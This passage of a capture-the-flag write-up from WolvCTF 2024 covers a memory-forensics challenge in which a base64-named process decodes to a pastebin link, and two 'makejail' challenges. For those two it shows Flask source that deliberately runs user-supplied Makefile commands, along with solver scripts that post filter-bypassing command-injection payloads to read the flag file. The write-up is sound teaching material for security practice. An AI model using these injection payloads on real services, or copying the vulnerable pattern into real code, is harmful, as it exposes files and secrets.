408     winlogon.exe    winlogon.exe
444     services.exe    C:\Windows\system32\services.exe
460     lsass.exe       C:\Windows\system32\lsass.exe
468     lsm.exe C:\Windows\system32\lsm.exe
576     svchost.exe     C:\Windows\system32\svchost.exe -k DcomLaunch
640     svchost.exe     C:\Windows\system32\svchost.exe -k RPCSS
692     svchost.exe     C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted
812     svchost.exe     C:\Windows\system32\svchost.exe -k netsvcs
860     svchost.exe     C:\Windows\system32\svchost.exe -k LocalService
908     svchost.exe     C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted
948     svchost.exe     C:\Windows\system32\svchost.exe -k NetworkService
240     svchost.exe     C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork
312     spoolsv.exe     Required memory at 0x7fffffdf020 is not valid (process exited?)
1040    svchost.exe     C:\Windows\system32\svchost.exe -k regsvc
1200    taskhost.exe    "taskhost.exe"
1304    dwm.exe "C:\Windows\system32\Dwm.exe"
1320    explorer.exe    C:\Windows\Explorer.EXE
1380    svchost.exe     C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted
1956    sppsvc.exe      C:\Windows\system32\sppsvc.exe
1680    cmd.exe "C:\Windows\system32\cmd.exe"
988     conhost.exe     \??\C:\Windows\system32\conhost.exe
2040    mscorsvw.exe    C:\Windows\Microsoft.NET\Framework\v2.0.50727\mscorsvw.exe
1332    mscorsvw.exe    C:\Windows\Microsoft.NET\Framework64\v2.0.50727\mscorsvw.exe
1992    svchost.exe     C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation
1852    msdtc.exe       C:\Windows\System32\msdtc.exe
804     cmd.exe "C:\Windows\system32\cmd.exe"
1868    conhost.exe     \??\C:\Windows\system32\conhost.exe
1644    notepad.exe     "C:\Windows\system32\NOTEPAD.EXE" C:\Users\joe\Desktop\schedule.txt
1804    cGFzdGViaW4uY2  "C:\temp\cGFzdGViaW4uY29tL3lBYTFhS2l1.exe"
896     multireader.ex  "C:\temp\multireader.exe"
1272    iexplore.exe    "C:\Program Files (x86)\Internet Explorer\iexplore.exe"
1284    iexplore.exe    "C:\Program Files (x86)\Internet Explorer\iexplore.exe" SCODEF:1272 CREDAT:71937
1536    spoolsv.exe     C:\Windows\System32\spoolsv.exe
1848    WmiPrvSE.exe    C:\Windows\system32\wbem\wmiprvse.exe
2052    WmiPrvSE.exe    C:\Windows\system32\wbem\wmiprvse.exe
2168    TrustedInstall  C:\Windows\servicing\TrustedInstaller.exe
2568    taskmgr.exe     "C:\Windows\system32\taskmgr.exe"  /1
```

Look athe process running `cGFzdGViaW4uY29tL3lBYTFhS2l1.exe`, decode it `cGFzdGViaW4uY29tL3lBYTFhS2l1`

```bash
$ echo "cGFzdGViaW4uY29tL3lBYTFhS2l1" | base64 -d
pastebin.com/yAa1aKiu
```

That's a pastebin link [https://pastebin.com/yAa1aKiu](https://pastebin.com/yAa1aKiu), and there's a flag on it

<br>
<div style="text-align:center">
<img src="https://raw.githubusercontent.com/nopedawn/CTF/main/WolvCTF24/Infiltration/pastebin-flag.png">
</div>
<br>

<details>
  <summary>FLAG</summary>
  
  > `wctf{v0lAt1l3_m3m0ry_4qu1r3D_a3fe9fn3al}`
    
</details>

<br>
<hr>

## Misc

### Made Sense

<details>
  <summary>Overview</summary>
  
  > Author: doubledelete <br>

  > Description: i couldn't log in to my server so my friend kindly spun up a server to let me test makefiles. at least, they thought i couldn't log in :P <br>

  [https://madesense-okntin33tq-ul.a.run.app/](https://madesense-okntin33tq-ul.a.run.app/)

</details>

This challenge is Misc PyJail called `Made Sense` that written using the Flask. 

```python {title="source.py" lineNos=true lineNoStart=1}
import os
from pathlib import Path
import re
import subprocess
import tempfile

from flask import Flask, request, send_file

app = Flask(__name__)
flag = open('flag.txt').read()

def write_flag(path):
    with open(path / 'flag.txt', 'w') as f:
        f.write(flag)

def generate_makefile(name, content, path):
    with open(path / 'Makefile', 'w') as f:
        f.write(f"""
SHELL := /bin/bash
.PHONY: {name}
{name}: flag.txt
\t{content}
""")

@app.route('/', methods=['GET'])
def index():
    return send_file('index.html')

@app.route('/src/', methods=['GET'])
def src():
    return send_file(__file__)

# made sense
@app.route('/make', methods=['POST'])
def make():
    target_name = request.form.get('name')
    code = request.form.get('code')

    print(code)
    if not re.fullmatch(r'[A-Za-z0-9]+', target_name):
        return 'no'
    if '\n' in code:
        return 'no'
    if re.search(r'flag', code):
        return 'no'

    with tempfile.TemporaryDirectory() as dir:
        run_dir = Path(dir)
        write_flag(run_dir)
        generate_makefile(target_name, code, run_dir)
        sp = subprocess.run(['make'], capture_output=True, cwd=run_dir)
        return f"""
<h1>stdout:</h1>
{sp.stdout}
<h1>stderr:</h1>
{sp.stderr}
    """

app.run('localhost', 8000)
```

If we take look at the source-code it's allows to create a Makefile with a target and a command, and then runs make in a temporary directory containing a flag file. And then checks for the presence of newline characters and the string `flag` in the command to prevent from reading the flag file directly. However, it doesn't prevent from using other commands or environment variables.

One possible solution is to use the cat command with a wildcard (*) instead of the filename. This will read all files in the directory, including the flag file.

<br>
<div style="text-align:center">
<img src="https://raw.githubusercontent.com/nopedawn/CTF/main/WolvCTF24/MadeSense/payload.png" width="400">
</div>
<br>

<br>
<div style="text-align:center">
<img src="https://raw.githubusercontent.com/nopedawn/CTF/main/WolvCTF24/MadeSense/response.png" width="400">
</div>
<br>

Final solver automation:

```python {title="solver.py" lineNos=true lineNoStart=1}
import requests
import re

data = {
    'name': 'target',
    'code': 'cat *'
}

response = requests.post('https://madesense-okntin33tq-ul.a.run.app/make', data=data)
flag = re.findall(r'wctf{.*}', response.text)

print(flag)
```

<details>
  <summary>FLAG</summary>
  
  > `wctf{m4k1ng_vuln3r4b1l1t135}`
    
</details>

<br>

### Made Functional

<details>
  <summary>Overview</summary>
  
  > Author: doubledelete <br>

  > Description: the second makejail <br>

  [https://madefunctional-okntin33tq-ul.a.run.app/](https://madefunctional-okntin33tq-ul.a.run.app/)

</details>

And the last but not least is same Misc PyJail challenge `Made Functional`, written using the Flask.

```python {title="source.py" lineNos=true lineNoStart=1}
import os
from pathlib import Path
import re
import subprocess
import tempfile

from flask import Flask, request, send_file

app = Flask(__name__)
flag = open('flag.txt').read()

def write_flag(path):
    with open(path / 'flag.txt', 'w') as f:
        f.write(flag)

def generate_makefile(name, content, path):
    with open(path / 'Makefile', 'w') as f:
        f.write(f"""
SHELL := env PATH= /bin/bash
.PHONY: {name}
{name}: flag.txt
\t{content}
""")

@app.route('/', methods=['GET'])
def index():
    return send_file('index.html')

@app.route('/src/', methods=['GET'])
def src():
    return send_file(__file__)

# made functional
@app.route('/make', methods=['POST'])
def make():
    target_name = request.form.get('name')
    code = request.form.get('code')

    print(code)
    if not re.fullmatch(r'[A-Za-z0-9]+', target_name):
        return 'no'
    if '\n' in code:
        return 'no'
    if re.search(r'/', code):
        return 'no'

    with tempfile.TemporaryDirectory() as dir:
        run_dir = Path(dir)
        write_flag(run_dir)
        generate_makefile(target_name, code, run_dir)
        sp = subprocess.run(['make'], capture_output=True, cwd=run_dir)
        return f"""
<h1>stdout:</h1>
{sp.stdout}
<h1>stderr:</h1>
{sp.stderr}
    """

app.run('localhost', 8000)
```

From the source it allows to create a Makefile with a target that executes some code when the target is built and it's a same vuln. The `SHELL` variable in the Makefile is set to `env PATH= /bin/bash`, which means that the `PATH` environment variable is set to an empty string when the shell command is executed. This means that the shell will not be able to find any executables in the `PATH`, so it will only execute commands that are defined in the Makefile itself.

first I simply using:

```
name = "readflag"
code = "< flag.txt"
```

<br>
<div style="text-align:center">
<img src="https://raw.githubusercontent.com/nopedawn/CTF/main/WolvCTF24/MadeFunctional/response1.png" width="400">
</div>
<br>

It seems like the command `< flag.txt` was executed, but it didn't produce any output. This is because the `<` operator is used for input redirection, and it needs a command to provide input to.

Unfortunately, we're limited by the fact that we can't use slashes, and most commands are located in directories that require a slash to access (like `/bin` or `/usr/bin`).

However, we can take advantage of the fact that Makefiles allow for multiple lines in the command section if they are separated by semicolons. We can use this feature to first assign the content of the flag file to a variable, and then echo that variable:

```
name = "readflag"
code = "read -r FLAG < flag.txt; echo $$FLAG"
```

<br>
<div style="text-align:center">
<img src="https://raw.githubusercontent.com/nopedawn/CTF/main/WolvCTF24/MadeFunctional/response2.png" width="400">
</div>
<br>

Final solver automation:

```python {title="solver.py" lineNos=true lineNoStart=1}
import requests
import re

data = {
    'name': 'readflag',
    'code': 'read -r FLAG < flag.txt; echo $$FLAG'
}

response = requests.post('https://madefunctional-okntin33tq-ul.a.run.app/make', data=data)
flag = re.findall(r'wctf{.*}', response.text)

print(flag)
```

<details>
  <summary>FLAG</summary>
  
  > `wctf{m4k1ng_f1l3s}`
    
</details>